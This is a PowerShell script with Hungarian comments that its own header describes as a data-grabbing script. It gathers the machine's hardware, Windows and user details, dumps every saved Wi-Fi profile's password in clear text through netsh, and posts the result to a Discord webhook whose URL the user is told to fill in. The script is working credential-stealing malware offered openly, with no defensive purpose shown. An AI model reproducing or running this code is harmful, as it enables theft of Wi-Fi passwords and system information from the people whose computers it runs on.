#This script gets out all infomations out of the system, and send it to somewhere, via discord webhook. Including Wifi passwords, the pc-s hardware info, os details.

# Ez egy közönséges adatszerző script...

# Stopper indítása:

$stopwatch = 0
$stopwatch =  [system.diagnostics.stopwatch]::StartNew()

# Jelenlegi idő:
$upTime = (get-date) - (gcim Win32_OperatingSystem).LastBootUpTime
$upTimeSt = "A szerver online {0:dd} napja, {0:hh} oraja, {0:mm} perce, {0:ss} masodperce" -f $upTime

# Szmáítógép adatainak begyűjtése:
$ComputerInfoData = Get-ComputerInfo -Property CsUserName, OsBuildNumber, OsArchitecture, TimeZone, WindowsProductName, WindowsRegisteredOwner, CsSystemType, CsManufacturer, CsModel, CsProcessors, CsPCSystemType | Select-Object CsUserName, OsBuildNumber, OsArchitecture, TimeZone, WindowsProductName, WindowsRegisteredOwner, CsSystemType, CsManufacturer, CsModel, CsProcessors, CsPCSystemType
Write-Host $ComputerInfoData
$ComputerInfoData.TimeZone
$CsProcessors = Out-String -InputObject $ComputerInfoData.CsProcessors;

#Számítógép adatainak formázása:
$CompData = "`r` **Computer Info:**`r` " + "__CsManufacturer__: " + $ComputerInfoData.CsManufacturer + "; `r` __CsModel__: " + $ComputerInfoData.CsModel + "; `r` __CsProcessors__: " + $CsProcessors + "; `r` __CsPCSystemType__: " + $ComputerInfoData.CsPCSystemType + ";"
$WinData = "`r` `r` **Windwos Info**`r` " + "__WindowsProductName__: " + $ComputerInfoData.WindowsProductName + "; `r` __WindowsRegisteredOwner__: " + $ComputerInfoData.WindowsRegisteredOwner + "; `r` __CsSystemType__: " + $ComputerInfoData.CsSystemType + ";"
$OSData = "`r` `r` **OS Info**`r` " + "__CsUserName__: " + $ComputerInfoData.CsUserName + ";"
$UserData = "`r` `r` **User Info**`r` " + "__OsBuildNumber__: " + $ComputerInfoData.OsBuildNumber + "; `r` __OsArchitecture__: " + $ComputerInfoData.OsArchitecture + ";"
$TimeData = "`r` `r` **Time Info**`r` " + "__TimeZone__: " + $ComputerInfoData.TimeZone + ";"


# Wifi:
$WifiKey = (netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)}  | Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ __PROFILE_NAME__=$name;__PASSWORD__=$pass }} | Format-List | Out-String
#Out-String -InputObject $WifiKey
$WifiData = "`r` `r` **Wifi Keys:** " + $WifiKey;


# Adateggyesítés egy változóba:
$EndData = $CompData + $WinData + $OSData + $UserData + $TimeData + $WifiData;
# A webhook apija:
$uri = "" # <-- illeszd be a sajátod

#Küldés WebHook botnak:

$hash = @{ "content" = "**"+"A rendszer allapota:`r` "+"**"+$upTimeSt+"`r` "+$EndData; } #Ez tartalmatzza az üzit
$JSON = $hash | convertto-json # Konvertálja a DC számára

Invoke-WebRequest -uri $uri -Method POST -Body $JSON -Headers @{'Content-Type' = 'application/json'}

    #Start-Sleep -s 600 #Ha esetleg kell várni akkor ez a wait block, a szám az másodpercet jelent...
$stopwatch

# És végül egy infinitie loop ha kéne...
<#
For(;;) 
{

}
#>

#Writen By TatarMatyasBence
